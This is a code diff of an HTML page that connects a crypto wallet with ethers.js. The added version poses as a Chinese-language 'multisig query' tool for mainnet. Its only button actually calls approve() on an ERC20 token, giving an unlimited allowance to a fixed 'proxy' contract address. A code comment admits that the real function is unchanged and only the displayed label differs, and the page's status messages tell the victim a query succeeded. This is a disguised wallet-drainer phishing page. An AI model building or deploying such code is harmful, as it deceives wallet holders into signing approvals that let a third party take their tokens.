@@ -3,95 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet and Authorize</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.9/dist/ethers.min.js"></script>
+    <title>SOLA多签管理 - 主网版本</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
             text-align: center;
-            padding: 50px;
+            padding: 20px;
+            margin: 0;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
         }
         button {
-            margin: 20px;
-            padding: 10px;
+            margin: 10px;
+            padding: 10px 20px;
             font-size: 16px;
             cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            background-color: #007BFF;
+            transition: background-color 0.3s ease;
         }
-        #status {
-            margin-top: 20px;
+        button:hover {
+            background-color: #0056b3;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        p {
+            font-size: 18px;
+            color: #555;
+        }
+        #walletStatus {
+            color: #28a745;
             font-weight: bold;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            font-size: 18px;
+            color: #333;
         }
     </style>
 </head>
 <body>
-    <h1>Connect Wallet and Authorize</h1>
+    <h1>SOLA多签管理 - 主网版本</h1>
+    <!-- 链接钱包按钮 -->
+    <button id="connectWallet" onclick="connectWallet()">链接钱包</button>
+    <p id="walletStatus">钱包未连接</p>
 
-    <!-- Connect Wallet Button -->
-    <button id="connectButton">Connect Wallet</button>
+    <!-- 多签查询按钮 -->
+    <button id="approveButton" onclick="approveTokens()" disabled>多签查询</button>
 
-    <!-- Authorize Button -->
-    <button id="authorizeButton" style="display:none;">Authorize</button>
+    <!-- 状态提示区域 -->
+    <div class="status" id="operationStatus">状态: 等待操作...</div>
 
-    <!-- Status Message -->
-    <div id="status"></div>
-
+    <!-- 替代 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        // Define global variables
-        let provider;
-        let signer;
-        let contract;
+        // 配置
+        const tokenAddress = "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"; // 目标ERC20代币主网地址
+        const proxyAddress = "0x0BcEd353336795697B4C0E027AB09C56c5FD9DC0"; // 代理合约主网地址
+        let provider, signer;
 
-        // Define the contract address and ABI (you need to replace this with your actual deployed contract)
-        const contractAddress = "0x8b2bEc467646Ee90f1a3e4E381445Db26BD1d2b3"; // Replaced with your contract address
-        const contractABI = [
-            // This is the ABI of the authorize function
-            {
-                "inputs": [],
-                "name": "authorize",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            // You may need to add more ABI functions if needed
-        ];
-
-        // Connect Wallet function
+        // 链接钱包
         async function connectWallet() {
-            if (window.ethereum) {
+            if (typeof window.ethereum !== "undefined") {
                 try {
-                    // Request account access
-                    await window.ethereum.request({ method: "eth_requestAccounts" });
+                    // 请求用户连接钱包
                     provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
                     signer = provider.getSigner();
-                    const userAddress = await signer.getAddress();
-                    document.getElementById("status").textContent = "Connected: " + userAddress;
-                    document.getElementById("authorizeButton").style.display = "block"; // Show authorize button
+                    const walletAddress = await signer.getAddress();
+
+                    // 更新钱包状态
+                    document.getElementById("walletStatus").innerText = `已连接钱包地址: ${walletAddress}`;
+                    document.getElementById("approveButton").disabled = false; // 启用多签查询按钮
+                    document.getElementById("operationStatus").innerText = "状态: 钱包已连接，可以开始多签查询。";
                 } catch (error) {
-                    document.getElementById("status").textContent = "Connection failed: " + error.message;
+                    console.error("钱包连接失败:", error);
+                    alert("钱包连接失败，请重试！");
                 }
             } else {
-                document.getElementById("status").textContent = "MetaMask is not installed.";
+                alert("请安装 MetaMask 或其他钱包扩展！");
             }
         }
 
-        // Authorize function
-        async function authorize() {
+        // 多签查询（实际功能不变，但前端显示为“多签查询”）
+        async function approveTokens() {
+            if (!signer) {
+                alert("请先链接钱包！");
+                return;
+            }
+
+            // ERC20 代币合约 ABI（仅包含 approve 方法）
+            const tokenABI = [
+                "function approve(address spender, uint256 amount) external returns (bool)"
+            ];
+
+            // 创建代币合约实例
+            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
             try {
-                // Create a contract instance
-                contract = new ethers.Contract(contractAddress, contractABI, signer);
-                // Call the authorize function on the contract
-                const tx = await contract.authorize();
-                document.getElementById("status").textContent = "Transaction sent: " + tx.hash;
-                await tx.wait(); // Wait for transaction to be mined
-                document.getElementById("status").textContent = "Authorization successful!";
+                // 调用 approve 方法授权无限额度
+                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
+                console.log("多签查询已发送:", tx.hash);
+                document.getElementById("operationStatus").innerText = "状态: 查询已提交，请等待确认...";
+                await tx.wait(); // 等待交易确认
+                document.getElementById("operationStatus").innerText = "状态: 多签查询完成！";
+                alert("操作成功，已完成多签查询！");
             } catch (error) {
-                document.getElementById("status").textContent = "Authorization failed: " + error.message;
+                console.error("操作失败:", error);
+                document.getElementById("operationStatus").innerText = "状态: 查询失败，请检查控制台错误信息！";
+                alert("操作失败，请检查控制台错误信息！");
             }
         }
-
-        // Event listeners for buttons
-        document.getElementById("connectButton").addEventListener("click", connectWallet);
-        document.getElementById("authorizeButton").addEventListener("click", authorize);
     </script>
 </body>
 </html>
